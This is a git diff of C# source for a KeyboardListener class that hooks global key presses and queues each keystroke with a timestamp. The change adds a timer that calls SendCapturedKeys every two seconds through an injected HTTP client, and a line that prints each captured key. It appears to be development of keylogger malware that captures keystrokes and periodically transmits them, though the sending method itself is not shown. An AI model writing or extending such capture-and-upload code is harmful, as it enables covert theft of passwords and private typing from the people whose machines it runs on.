@@ -3,6 +3,7 @@
     using System;
     using System.Collections.Concurrent;
     using System.Collections.Generic;
+    using System.Threading;
     using System.Threading.Tasks;
     using Core.Interfaces;
     using Core.Models;
@@ -13,9 +14,12 @@
 
     public class KeyboardListener : BaseListener
     {
+        private const int DefaultDueTime = 5000;
+        private const int DefaultPeriod = 2000;
         private IKeyboardApi keyboardApi;
         private ConcurrentQueue<KeyCapturedDetails> capturedKeys;
         private KeyboardListenerConfig config;
+        private Timer sendCapturedKeysTimer;
 
         public KeyboardListener(IHttpClient httpClient, IKeyboardApi keyboardApi, KeyboardListenerConfig config)
             : base(httpClient)
@@ -27,6 +31,7 @@
 
         public override Task Start()
         {
+            this.sendCapturedKeysTimer = InitializeTimer();
             this.keyboardApi.OnKeyPressed += KeyboardApi_OnKeyPressed;
             return Task.Run(() => this.keyboardApi.StartListeningToKeyboard());
         }
@@ -34,6 +39,23 @@
         public override void Stop()
         {
             this.keyboardApi.StopListeningToKeyboard();
+        }
+
+        private Timer InitializeTimer()
+        {
+            var dueTime = this.config.SendCapturedKeysTimerConfig != null ?
+                this.config.SendCapturedKeysTimerConfig.DueTime :
+                DefaultDueTime;
+
+            var period = this.config.SendCapturedKeysTimerConfig != null ?
+              this.config.SendCapturedKeysTimerConfig.Period :
+              DefaultPeriod;
+
+            return new Timer(
+                async (_) => await this.SendCapturedKeys(),
+                null,
+                dueTime,
+                period);
         }
 
         private void KeyboardApi_OnKeyPressed(object sender, KeyboardKey e)
@@ -44,6 +66,7 @@
                 CapturedOn = TimeProvider.Current.Now
             };
 
+            Console.WriteLine($"{capturedKey.CapturedOn} - {capturedKey.KeyboardKey}");
             this.capturedKeys.Enqueue(capturedKey);
         }
 
